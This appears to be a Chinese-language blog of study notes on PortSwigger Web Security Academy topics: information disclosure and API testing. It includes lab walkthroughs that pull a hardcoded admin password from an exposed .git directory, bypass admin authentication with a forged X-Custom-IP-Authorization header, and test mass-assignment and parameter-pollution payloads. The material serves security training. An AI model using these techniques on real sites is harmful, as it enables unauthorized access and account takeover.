<p>同样，您可以检查是否存在任何常见的配置错误或危险默认设置，您可能会利用这些错误或设置。其中一些可能会在官方文档中突出显示。您可能还会发现该网站使用的是某种开源框架。在这种情况下，您可以研究公开可用的源代码，这是构建自己的漏洞利用程序的无价资源。错误消息之间的差异也可以揭示幕后发生的不同应用程序行为。观察错误消息之间的差异是许多技术的关键方面，例如 SQL 注入、用户名枚举等。</p>
<p><img src="/images/image-20251124191740-ope5rcj.png" alt="image"></p>
<h2 id="3-5Debugging-data"><a href="#3-5Debugging-data" class="headerlink" title="3.5Debugging data"></a>3.5Debugging data</h2><p>为了便于调试，许多网站会生成包含大量应用程序行为信息的自定义错误消息和日志。虽然这些信息在开发过程中很有用，但如果在生产环境中泄露，它们对攻击者也非常有用。调试消息有时会包含开发攻击的重要信息，包括：</p>
<p>•可以通过用户输入操纵的关键会话变量的值</p>
<p>•后端组件的主机名和凭证</p>
<p>•服务器上的文件和目录名</p>
<p>•用于加密通过客户端传输的数据的密钥调试信息有时会记录在单独的文件中。</p>
<p>如果攻击者能够访问此文件，它可以作为理解应用程序运行时状态的有用参考。它还可以提供一些线索，告诉他如何提供精心设计的输入来操纵应用程序状态和控制接收到的信息。</p>
<p><img src="/images/image-20251124205427-hq1f2l0.png" alt="image"></p>
<p><img src="/images/image-20251124205711-pvi3udp.png" alt="image"></p>
<p>‍</p>
<h2 id="3-6-User-account-pages"><a href="#3-6-User-account-pages" class="headerlink" title="3.6 User account pages"></a>3.6 User account pages</h2><p>用户资料页面通常包含敏感信息</p>
<p>由于其性质，用户资料或账户页面通常包含敏感信息，例如用户的电子邮件地址、电话号码、API 密钥等。由于用户通常只能访问自己的账户页面，因此这本身并不代表一个漏洞。然而，一些网站存在逻辑缺陷，可能允许攻击者利用这些页面来查看其他用户的数据。例如，考虑一个根据用户参数确定加载哪个用户账户页面的网站。</p>
<p>大多数网站会采取措施防止攻击者简单地更改此参数以访问任意用户的账户页面。然而，有时加载单个数据项目的逻辑并不那么健壮。攻击者可能无法完全加载另一个用户的账户页面，但是用于获取和渲染用户注册电子邮件地址的逻辑可能不会检查用户参数是否与当前登录的用户匹配。</p>
<p>在这种情况下，只需更改用户参数，攻击者就可以在自己的账户页面上显示任意用户的电子邮件地址。当我们介绍访问控制和 IDOR 漏洞时，我们将更详细地研究这些类型的漏洞。</p>
<h2 id="3-7-Source-code-disclosure-via-backup-files"><a href="#3-7-Source-code-disclosure-via-backup-files" class="headerlink" title="3.7 Source code disclosure via backup files"></a>3.7 Source code disclosure via backup files</h2><p>获取源代码访问权限使攻击者更容易理解应用程序的行为并构建高严重性攻击。敏感数据有时甚至直接硬编码在源代码中。典型的例子包括用于访问后端组件的 API 密钥和凭证。</p>
<p>如果你能够确定某个特定的开源技术正在被使用，这将提供对有限数量源代码的轻松访问。</p>
<p>偶尔，甚至有可能导致网站暴露自己的源代码。在绘制网站地图时，你可能会发现一些源代码文件被明确引用。不幸的是，请求它们通常不会显示代码本身。当服务器处理具有特定扩展名（例如.php）的文件时，它通常会执行代码，而不是简单地将其作为文本发送给客户端。</p>
<p>然而，在某些情况下，你可以诱使网站返回文件的内容。</p>
<p>例如，文本编辑器在编辑原始文件时通常会生成临时备份文件。这些临时文件通常会以某种方式表示，例如在文件名后附加波浪号（~）或添加不同的文件扩展名。使用备份文件扩展名请求代码文件有时可以让你在响应中读取文件的内容。</p>
<p>‍</p>
<h3 id="Information-disclosure-due-to-insecure-configuration"><a href="#Information-disclosure-due-to-insecure-configuration" class="headerlink" title="Information disclosure due to insecure configuration"></a>Information disclosure due to insecure configuration</h3><h2 id="3-8-Information-disclosure-due-to-insecure-configuration"><a href="#3-8-Information-disclosure-due-to-insecure-configuration" class="headerlink" title="3.8 Information disclosure due to insecure configuration"></a>3.8 Information disclosure due to insecure configuration</h2><p>网站有时会因为配置不当而变得脆弱。这尤其常见，因为广泛使用了第三方技术，而这些第三方技术的众多配置选项并不一定被实施者很好地理解。</p>
<p>在其他情况下，开发人员可能会忘记在生产环境中禁用各种调试选项。</p>
<p>例如，HTTP TRACE方法是为了诊断目的而设计的。如果启用，Web服务器将使用TRACE方法对请求做出响应，在响应中回显收到的确切请求。</p>
<p>这种行为通常是无害的，但偶尔会导致信息泄露，例如反向代理可能会附加到请求中的内部身份验证标头的名称。</p>
<p>‍</p>
<h2 id="3-9-Version-control-history"><a href="#3-9-Version-control-history" class="headerlink" title="3.9 Version control history"></a>3.9 Version control history</h2><p>几乎所有的网站开发都使用某种形式的版本控制系统，比如Git。</p>
<p>默认情况下，Git项目将其所有版本控制数据存储在一个名为.git的文件夹中。有时，网站会在生产环境中公开这个目录。在这种情况下，你可能只需浏览到&#x2F;.git就能访问它。</p>
<p>虽然手动浏览原始文件结构和内容通常是不切实际的，但有多种方法可以下载整个.git目录。然后，你可以使用本地安装的Git打开它，以访问网站的版本控制历史记录。其中可能包括包含提交更改的日志和其他有趣的信息。这可能不会让你访问完整的源代码，但比较差异将允许你阅读代码的小片段。</p>
<p>与任何源代码一样，你可能还会发现一些更改的行中硬编码了敏感数据。</p>
<h1 id="Lab"><a href="#Lab" class="headerlink" title="Lab"></a>Lab</h1><h2 id="Lab-Information-disclosure-in-version-control-history"><a href="#Lab-Information-disclosure-in-version-control-history" class="headerlink" title="Lab: Information disclosure in version control history"></a>Lab: Information disclosure in version control history</h2><p>本实验室通过其版本控制历史记录公开敏感信息。解决方法：获取administrator用户密码，登录后删除carlos用户。 </p>
<p>打开实验室并浏览到&#x2F;.git 以揭示实验室的 Git 版本控制数据。</p>
<p>下载此整个目录的副本。对于 Linux 用户，最简单的方法是使用以下命令：wget -r <a target="_blank" rel="noopener" href="https://your-lab-id.web-security-academy.net/.git/">https://YOUR-LAB-ID.web-security-academy.net/.git/</a> Windows 用户将需要找到其他方法，或者安装类 UNIX 的环境，例如 Cygwin，以便使用此命令。</p>
<p>使用您本地的 Git 安装浏览下载的目录。</p>
<p>请注意，有一个提交的信息为“从配置中删除管理员密码”。仔细查看更改的 admin.conf 文件的差异。</p>
<p>请注意，提交用环境变量 ADMIN_PASSWORD 替换了硬编码的管理员密码。</p>
<p>但是，硬编码的密码在差异中仍然清晰可见。返回实验室并使用泄漏的密码登录到管理员帐户。要解决实验室，请打开管理界面并删除 carlos。</p>
<h4 id="git-bash安装wget"><a href="#git-bash安装wget" class="headerlink" title="git bash安装wget"></a>git bash安装wget</h4><p><a target="_blank" rel="noopener" href="https://eternallybored.org/misc/wget/">GNU Wget 1.21.4 for Windows</a></p>
<p>‍</p>
<p>​<code>gitk</code>​ 是一个非常轻量级的 Git 仓库浏览器，通常是 Git 安装时的一部分，或者很容易通过包管理器获得。它主要用于查看<strong>历史提交记录、分支结构和文件差异</strong>。</p>
<p>下个git管理工具：gitk</p>
<p><img src="/images/image-20251124220315-aakhwjr.png" alt="image"></p>
<p>‍</p>
<p>‍</p>
<h2 id="Lab-Authentication-bypass-via-information-disclosure"><a href="#Lab-Authentication-bypass-via-information-disclosure" class="headerlink" title="Lab: Authentication bypass via information disclosure"></a>Lab: Authentication bypass via information disclosure</h2><p>这个实验室的管理界面存在一个身份验证绕过漏洞，但是如果没有前端使用的自定义HTTP头部的知识，就不可能利用这个漏洞。</p>
<p>为了解决这个实验室，获取头部的名称，然后使用它来绕过实验室的身份验证。访问管理界面并删除用户carlos。您可以使用以下凭据登录到自己的账户：wiener:peter</p>
<p><img src="/images/image-20251124212521-nvus7fc.png" alt="image"></p>
<h4 id="🔎-TRACE-方法的作用"><a href="#🔎-TRACE-方法的作用" class="headerlink" title="🔎 TRACE 方法的作用"></a>🔎 TRACE 方法的作用</h4><p>当客户端发送一个 <code>TRACE</code>​ 请求到服务器时，服务器必须将它接收到的完整请求消息（包括请求行、头部和消息体，如果存在）作为<strong>响应体</strong>原封不动地返回给客户端。</p>
<p>这个过程主要有以下用途：</p>
<ol>
<li><strong>路径诊断 (Path Diagnosis)：</strong>  帮助客户端检查在请求到达目标服务器的过程中，请求信息是否被路径上的<strong>中间代理服务器 (Proxies)</strong>  篡改或修改。</li>
<li><strong>头部检查 (Header Inspection)：</strong>  确认客户端发送的特定请求头部（Headers）是否正确地到达了最终服务器。这对于检查缓存、认证或自定义头部非常有用。</li>
<li><strong>调试代理问题 (Debugging Proxy Issues)：</strong>  如果请求经过了多个代理服务器，<code>TRACE</code> 响应可以显示这些代理在请求中添加、修改或删除了哪些头部信息，从而帮助诊断代理链中的配置问题。</li>
</ol>
<h4 id="⚠️-安全风险（为何常被禁用）"><a href="#⚠️-安全风险（为何常被禁用）" class="headerlink" title="⚠️ 安全风险（为何常被禁用）"></a>⚠️ 安全风险（为何常被禁用）</h4><p>虽然 <code>TRACE</code>​ 是一种调试工具，但在实际部署中，出于安全考虑，它​<strong>通常是被禁用的</strong>。</p>
<p>主要的风险在于：​<strong>跨站追踪攻击 (Cross-Site Tracing, XST)</strong> 。</p>
<ul>
<li><strong>风险描述：</strong>  攻击者可以结合 <code>TRACE</code>​ 方法和跨站脚本 (XSS) 漏洞，绕过某些安全措施（如 <code>HttpOnly</code> cookie 保护机制）。</li>
<li><strong>攻击原理：</strong>  如果一个网站存在 XSS 漏洞，攻击者可以注入 JavaScript 代码，利用该代码发送 <code>TRACE</code>​ 请求。由于 <code>TRACE</code>​ 请求会将服务器收到的所有头部信息返回到响应体中，其中就可能包含<strong>用户的敏感 Cookie</strong>（如会话 ID）。攻击者的脚本就可以读取这个响应体，从而窃取用户的会话 Cookie，进行会话劫持。</li>
</ul>
<p>‍</p>
<p>‍</p>
<p>在Burp Repeater中，浏览至GET &#x2F;admin。响应显示，管理员面板只有在以管理员身份登录或从本地IP请求时才能访问。</p>
<p><img src="/images/image-20251124213142-woeehpa.png" alt="image"><br>再次发送请求，但这次使用TRACE方法：TRACE &#x2F;admin。<br>研究响应。注意，包含您的IP地址的X-Custom-IP-Authorization标头自动附加到您的请求中。这用于确定请求是否来自本地主机IP地址。<br>转到Proxy &gt; Match and replace。</p>
<p><img src="/images/image-20251124213256-bgox70f.png" alt="image"><br>在HTTP匹配和替换规则下，单击Add。添加匹配&#x2F;替换规则对话框打开。<br>保持匹配字段为空。<br>在类型下，确保选择了请求标头。<br>在替换字段中，输入以下内容：X-Custom-IP-Authorization: 127.0.0.1。<br>单击测试。<br>在自动修改的请求下，注意Burp已经将X-Custom-IP-Authorization标头添加到修改后的请求中。<br>单击确定。Burp代理现在将X-Custom-IP-Authorization标头添加到您发送的每个请求中。<br>浏览至首页。注意，您现在可以访问管理员面板，在那里您可以删除carlos。</p>
<h1 id=""><a href="#" class="headerlink" title=""></a></h1>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2026/01/25/Information%20disclosure/" data-id="cmktvklus0000wwvs1g9w5zd4" data-title="6.Information disclosure" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-API testing" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2026/01/23/API%20testing/" class="article-date">
  <time class="dt-published" datetime="2026-01-23T00:25:47.000Z" itemprop="datePublished">2026-01-23</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/portswigger/">portswigger</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2026/01/23/API%20testing/">5.API testing</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>修订时间：2026.1.23</p>
<p>API（应用程序编程接口）使软件系统和应用程序能够进行通信和共享数据。</p>
<p>所有动态网站都由API组成，因此经典的Web漏洞（如SQL注入）可以归类为API测试。</p>
<p>在这个主题中，我们将教你如何测试网站前端没有完全使用的API，重点是RESTful和JSON API。</p>
<p>我们还将教你如何测试可能影响内部API的服务器端参数污染漏洞。</p>
<h1 id="1-API-recon-明确端点——交互"><a href="#1-API-recon-明确端点——交互" class="headerlink" title="1.API recon(明确端点——交互)"></a>1.API recon(明确端点——交互)</h1><p>要开始进行API测试，您首先需要尽可能多地了解有关API的信息，以发现其攻击面。首先，您应该确定API端点。这些是API在其服务器上接收有关特定资源的请求的位置。例如，考虑以下GET请求：</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">GET</span> <span class="string">/api/books</span> <span class="string">HTTP/1.1</span></span><br><span class="line"><span class="attr">Host:</span> <span class="string">example.com</span></span><br></pre></td></tr></table></figure>

<p>这个请求的API端点是&#x2F;api&#x2F;books。这将导致与API的交互，以从图书馆检索书籍列表。另一个API端点可能是，例如，&#x2F;api&#x2F;books&#x2F;mystery，它将检索神秘书籍的列表。一旦确定了端点，就需要确定如何与它们进行交互。这使您能够构建有效的HTTP请求以测试API。例如，您应该找出以下信息：<br>• API处理的输入数据，包括必填和可选参数。<br>• API接受的请求类型，包括支持的HTTP方法和媒体格式。<br>• 速率限制和身份验证机制。</p>
<h1 id="2-API-documentation"><a href="#2-API-documentation" class="headerlink" title="2.API documentation"></a>2.API documentation</h1><p>API 通常会有文档记录，以便开发者了解如何使用和整合它们。文档可以是人类可读或机器可读的格式。人类可读的文档旨在让开发者了解如何使用 API。它可能包含详细的解释、示例和使用场景。</p>
<p>机器可读的文档旨在被软件处理，以自动化 API 整合和验证等任务。</p>
<p>它以 JSON 或 XML 等结构化格式编写。API 文档通常是对外公开的，特别是如果 API 是供外部开发者使用时。如果是这样的话，请始终从查看文档开始进行侦察。</p>
<h2 id="2-1-Discovering-API-documentation"><a href="#2-1-Discovering-API-documentation" class="headerlink" title="2.1 Discovering API documentation()"></a>2.1 Discovering API documentation()</h2><p>即使API文档不是公开可用的，您仍然可以通过浏览使用该API的应用程序来访问它。为此，您可以使用Burp Scanner来抓取API。您也可以使用Burp的浏览器手动浏览应用程序。查找可能引用API文档的端点，例如：</p>
<ul>
<li>​<code>/api</code></li>
<li>​<code>/swagger/index.html</code></li>
<li>​<code>/openapi.json</code></li>
</ul>
<p>如果您为资源确定了端点，请确保调查基本路径。例如，如果您确定了资源端点&#x2F;api&#x2F;swagger&#x2F;v1&#x2F;users&#x2F;123，那么您应该调查以下路径：</p>
<ul>
<li>​<code>/api/swagger/v1</code></li>
<li>​<code>/api/swagger</code></li>
<li>​<code>/api</code></li>
</ul>
<h2 id="2-2-使用机器可读的文档"><a href="#2-2-使用机器可读的文档" class="headerlink" title="2.2 使用机器可读的文档"></a>2.2 使用机器可读的文档</h2><p>您可以使用一系列自动化工具来分析找到的任何机器可读的API文档。您可以使用Burp Scanner抓取和审计OpenAPI文档，或JSON或YAML格式的任何其他文档。您还可以使用OpenAPI Parser BApp解析OpenAPI文档。您还可以使用专门的工具来测试记录的端点，例如Postman或SoapUI。</p>
<h1 id="3-Identifying-API-endpoints（scanner和js文件）"><a href="#3-Identifying-API-endpoints（scanner和js文件）" class="headerlink" title="3.Identifying API endpoints（scanner和js文件）"></a>3.Identifying API endpoints（scanner和js文件）</h1><p>通过浏览使用API的应用程序，您还可以收集大量信息。即使您可以访问API文档，这也通常值得一做，因为有时文档可能不准确或过时。您可以使用Burp Scanner爬取应用程序，然后使用Burp的浏览器手动调查有趣的攻击面。在浏览应用程序时，寻找URL结构中暗示API端点的模式，例如&#x2F;api&#x2F;。同时还要注意JavaScript文件。这些文件可能包含您尚未通过Web浏览器直接触发的API端点的引用。</p>
<h2 id="3-1-Interacting-with-API-endpoints"><a href="#3-1-Interacting-with-API-endpoints" class="headerlink" title="3.1 Interacting with API endpoints"></a>3.1 Interacting with API endpoints</h2><p>一旦确定了API端点，就使用Burp Repeater和Burp Intruder与它们进行交互。这使您能够观察API的行为并发现额外的攻击面。例如，您可以调查API如何响应更改HTTP方法和媒体类型。在与API端点进行交互时，请仔细查看错误消息和其他响应。有时，这些信息中包含可用于构造有效HTTP请求的内容。</p>
<h2 id="3-2-Identifying-supported-HTTP-methods"><a href="#3-2-Identifying-supported-HTTP-methods" class="headerlink" title="3.2 Identifying supported HTTP methods"></a>3.2 Identifying supported HTTP methods</h2><p>HTTP方法指定了对资源执行的操作。例如：</p>
<ul>
<li>GET - 从资源中检索数据。</li>
<li>PATCH - 对资源应用部分更改。</li>
<li>OPTIONS - 检索有关可以在资源上使用的请求方法类型的信息。</li>
</ul>
<p>‍</p>
<p>API端点可能支持不同的HTTP方法。因此，在调查API端点时，测试所有潜在的方法非常重要。这可能会使您能够识别其他端点功能，从而打开更多的攻击面。例如，端点&#x2F;api&#x2F;tasks可以支持以下方法：</p>
<ul>
<li>GET &#x2F;api&#x2F;tasks - 检索任务列表。</li>
<li>POST &#x2F;api&#x2F;tasks - 创建一个新任务。</li>
<li>DELETE &#x2F;api&#x2F;tasks&#x2F;1 - 删除任务。</li>
</ul>
<p>您可以使用Burp Intruder中<strong>内置的HTTP动词列表</strong>自动循环遍历一系列方法。在测试不同的HTTP方法时，要以低优先级对象为目标。这有助于确保您避免意外的后果，例如更改关键项或创建过多的记录。</p>
<h2 id="3-3-Identifying-supported-content-types"><a href="#3-3-Identifying-supported-content-types" class="headerlink" title="3.3 Identifying supported content types"></a>3.3 Identifying supported content types</h2><p>API 端点通常期望数据采用特定格式。因此，它们可能会根据请求中提供的数据内容类型表现出不同的行为。更改内容类型可能会使您能够：<br>• 触发披露有用信息的错误。<br>• 绕过有缺陷的防御。<br>• 利用处理逻辑的差异。<br>例如，处理 JSON 数据时 API 可能是安全的，但在处理 XML 时则容易受到注入攻击。<br>要更改内容类型，请修改 Content-Type 标头，然后相应地重新格式化请求正文。您可以使用“<a target="_blank" rel="noopener" href="https://portswigger.net/bappstore/db57ecbe2cb7446292a94aa6181c9278">Content type converter</a>”BApp 自动转换请求中提交的数据在 XML 和 JSON 之间的格式。</p>
<h3 id="3-4-Using-Intruder-to-find-hidden-endpoints"><a href="#3-4-Using-Intruder-to-find-hidden-endpoints" class="headerlink" title="3.4 Using Intruder to find hidden endpoints"></a>3.4 Using Intruder to find hidden endpoints</h3><p>一旦您确定了一些初始的API端点，您可以使用Intruder来揭露隐藏的端点。例如，考虑这样一种情况：您已经确定了以下用于更新用户信息的API端点：PUT &#x2F;api&#x2F;user&#x2F;update</p>
<p>为了确定隐藏的端点，您可以使用Burp Intruder来查找具有相同结构的其他资源。例如，您可以在路径的&#x2F;update位置添加一个有效负载，其中包含其他常见功能的列表，例如delete和add。在寻找隐藏的端点时，请使用基于常见API命名约定和行业术语的词表。确保您还根据您的初步侦察包括与应用相关的术语。</p>
<h1 id="4-Finding-hidden-parameters"><a href="#4-Finding-hidden-parameters" class="headerlink" title="4.Finding hidden parameters"></a>4.Finding hidden parameters</h1><p>在进行API侦察时，您可能会发现API支持的一些未记录参数。您可以尝试使用这些参数来更改应用程序的行为。Burp包含许多可以帮助您识别隐藏参数的工具：<br>• Burp Intruder允许您使用常见参数名称的单词表自动发现隐藏参数，以替换现有参数或添加新参数。确保您还根据初始侦察包含与应用相关的名称。<br>• <a target="_blank" rel="noopener" href="https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943">Param miner</a>  BApp允许您每个请求自动猜测多达65,536个参数名称。参数矿工根据从范围中获取的信息自动猜测与应用相关的名称。<br>• <a target="_blank" rel="noopener" href="https://portswigger.net/burp/documentation/desktop/tools/engagement-tools/content-discovery">Content discovery</a>工具使您能够发现与您可以浏览到的可见内容没有链接的内容，包括参数。</p>
<h2 id="4-1-Mass-assignment-vulnerabilities"><a href="#4-1-Mass-assignment-vulnerabilities" class="headerlink" title="4.1 Mass assignment vulnerabilities"></a>4.1 Mass assignment vulnerabilities</h2><p>批量赋值（也称为自动绑定）可能会无意中创建隐藏的参数。这发生在软件框架自动将请求参数绑定到内部对象的字段上时。因此，批量赋值可能会导致应用程序支持开发人员从未打算处理的参数。</p>
<h3 id="4-1-1-Identifying-hidden-parameters"><a href="#4-1-1-Identifying-hidden-parameters" class="headerlink" title="4.1.1 Identifying hidden parameters"></a>4.1.1 Identifying hidden parameters</h3><p>因为批量赋值会从对象字段中创建参数，所以您通常可以通过手动检查 API 返回的对象来识别这些隐藏参数。例如，考虑一个 PATCH &#x2F;api&#x2F;users&#x2F; 请求，它允许用户更新他们的用户名和电子邮件，并包含以下 JSON:</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;wiener&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;email&quot;</span><span class="punctuation">:</span> <span class="string">&quot;wiener@example.com&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>一个并发GET &#x2F;api&#x2F;users&#x2F;123请求返回如下JSON：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="number">123</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;John Doe&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;email&quot;</span><span class="punctuation">:</span> <span class="string">&quot;john@example.com&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;isAdmin&quot;</span><span class="punctuation">:</span> <span class="string">&quot;false&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>这可能表明隐藏的id和isAdmin参数与更新的用户名和电子邮件参数一起绑定到内部用户对象。</p>
<h3 id="4-1-2-Testing-mass-assignment-vulnerabilities"><a href="#4-1-2-Testing-mass-assignment-vulnerabilities" class="headerlink" title="4.1.2 Testing mass assignment vulnerabilities"></a>4.1.2 Testing mass assignment vulnerabilities</h3><p>为了测试您是否可以修改枚举的isAdmin参数值，请将其添加到PATCH请求中：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;wiener&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;email&quot;</span><span class="punctuation">:</span> <span class="string">&quot;wiener@example.com&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;isAdmin&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>另外，发送一个带有无效isAdmin参数值的PATCH请求：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;wiener&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;email&quot;</span><span class="punctuation">:</span> <span class="string">&quot;wiener@example.com&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;isAdmin&quot;</span><span class="punctuation">:</span> <span class="string">&quot;foo&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>如果应用程序的行为不同，这可能表明无效值会影响查询逻辑，而有效值则不会。这可能表明参数可以被用户成功更新。然后，您可以发送一个PATCH请求，将isAdmin参数值设置为true，以尝试利用该漏洞：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;wiener&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;email&quot;</span><span class="punctuation">:</span> <span class="string">&quot;wiener@example.com&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;isAdmin&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>如果请求中的isAdmin值没有经过充分的验证和处理就绑定到用户对象，则可能会错误地授予用户管理员权限。</p>
<p>‍</p>
<h1 id="5-Server-side-parameter-pollution"><a href="#5-Server-side-parameter-pollution" class="headerlink" title="5.Server-side parameter pollution"></a>5.Server-side parameter pollution</h1><p>服务器端参数污染漏洞是指当一个网站在向内部API发送服务器端请求时，将用户输入嵌入其中而没有进行适当的编码时发生的情况。</p>
<p>这意味着攻击者可能能够操纵或注入参数，从而例如：</p>
<p>覆盖现有参数、修改应用程序行为、访问未经授权的数据。</p>
<p>您可以测试任何用户输入的任何类型的参数污染。例如，查询参数、表单字段、标头和URL路径参数都可能容易受到攻击。</p>
<h2 id="5-1-Testing-for-server-side-parameter-pollution-in-the-query-string"><a href="#5-1-Testing-for-server-side-parameter-pollution-in-the-query-string" class="headerlink" title="5.1 Testing for server-side parameter pollution in the query string"></a>5.1 Testing for server-side parameter pollution in the query string</h2><p>要测试服务器端查询字符串中的参数污染漏洞，请在输入中加入查询语法字符（如#、&amp;和&#x3D;），并观察应用程序的响应。<br>假设存在一个存在漏洞的应用程序，允许用户根据用户名搜索其他用户。当搜索用户时，浏览器会发送以下请求：<br>​<code>GET /userSearch?name=peter&amp;back=/home</code>​<br>为获取用户信息，服务器会向内部API发送如下请求：<br>​<code>GET /users/search?name=peter&amp;publicProfile=true</code></p>
<p>‍</p>
<h3 id="5-1-1-截断-23"><a href="#5-1-1-截断-23" class="headerlink" title="5.1.1 截断#%23"></a>5.1.1 截断#%23</h3><p>必须对#字符进行URL编码。否则前端应用程序会将其解释为片段标识符，导致该参数无法传递至内部API。</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">您可以使用URL编码的#字符尝试截断服务器端请求。为帮助您解析响应，还可以在#字符后添加字符串。</span></span><br><span class="line"><span class="string">例如，可将查询字符串修改为：</span></span><br><span class="line"><span class="string">GET</span> <span class="string">/userSearch?name=peter%23foo&amp;back=/home</span></span><br><span class="line"><span class="string">此时前端将尝试访问以下URL：</span></span><br><span class="line"><span class="string">GET</span> <span class="string">/users/search?name=peter#foo&amp;publicProfile=true</span></span><br></pre></td></tr></table></figure>

<p>检查响应内容以判断查询是否被截断。例如，若响应返回用户名 peter，则服务器端查询可能已被截断。若返回无效名称错误信息，则应用程序可能将 foo 视为用户名的一部分。这表明服务器端请求可能未被截断。<br>若能截断服务器端请求，则无需强制设置publicProfilefield为true。此漏洞可被利用以获取非公开用户资料。</p>
<h3 id="5-1-2-注入-26"><a href="#5-1-2-注入-26" class="headerlink" title="5.1.2 注入&amp;%26"></a>5.1.2 注入&amp;%26</h3><p>您可以使用URL编码的&amp;字符尝试在服务器端请求中添加第二个参数。<br>例如，可将查询字符串修改为：<br>​<code>GET /userSearch?name=peter%26foo=xyz&amp;back=/home</code>​<br>这将导致服务器端向内部API发送以下请求：<br>​<code>GET /users/search?name=peter&amp;foo=xyz&amp;publicProfile=true</code><br>通过响应内容可推断附加参数的解析方式。例如，若响应内容未改变，可能表明参数成功注入但被应用程序忽略。<br>若您能够修改查询字符串，则可尝试在服务器端请求中添加第二个有效参数。</p>
<p>例如，若已识别出电子邮件参数，可按以下方式将其添加至查询字符串：<br>​<code>GET /userSearch?name=peter&amp;email=foo&amp;back=/home</code>​<br>这将导致服务器端向内部API发出如下请求：<br>​<code>GET /users/search?name=peter&amp;email=foo&amp;publicProfile=true</code><br>请通过响应内容分析附加参数的解析方式。</p>
<h3 id="5-1-3-并覆盖存在参数"><a href="#5-1-3-并覆盖存在参数" class="headerlink" title="5.1.3 并覆盖存在参数"></a>5.1.3 并覆盖存在参数</h3><p>要确认应用程序是否存在服务器端参数污染漏洞，可尝试覆盖原始参数。具体操作是注入第二个同名参数。<br>例如，可将查询字符串修改为：<br>GET &#x2F;userSearch?name&#x3D;peter%26name&#x3D;carlos&amp;back&#x3D;&#x2F;home<br>这将导致服务器向内部API发送如下请求：<br>GET &#x2F;users&#x2F;search?name&#x3D;peter&amp;name&#x3D;carlos&amp;publicProfile&#x3D;true<br>内部API将解析两个name参数。实际影响取决于应用程序对第二个参数的处理方式，不同Web技术存在差异：<br>• PHP仅解析最后一个参数，将执行carlos用户搜索<br>• ASP.NET合并两个参数，将执行peter,carlos用户搜索，可能触发”用户名无效”错误<br>• Node.js&#x2F;express 仅解析首个参数。这将导致用户搜索 peter，结果保持不变。<br>若能覆盖原始参数，则可能实现漏洞利用。例如在请求中添加 name&#x3D;administrator，这可能使您以管理员身份登录。</p>
